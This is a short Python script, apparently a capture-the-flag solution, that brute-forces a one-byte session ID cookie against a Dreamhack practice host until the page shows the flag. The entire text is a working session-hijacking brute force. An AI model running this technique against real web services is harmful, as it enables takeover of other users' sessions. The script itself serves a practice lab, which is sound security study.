import requests
import os

for i in range(300):
    sess_id = os.urandom(1).hex()
    url = 'http://host1.dreamhack.games:13201/'
    headers = {
        'Cookie': f'sessionid={sess_id}'
    }
    res = requests.get(url, headers=headers)
    if res.text.find('flag') != -1:
        print(res.text)
        break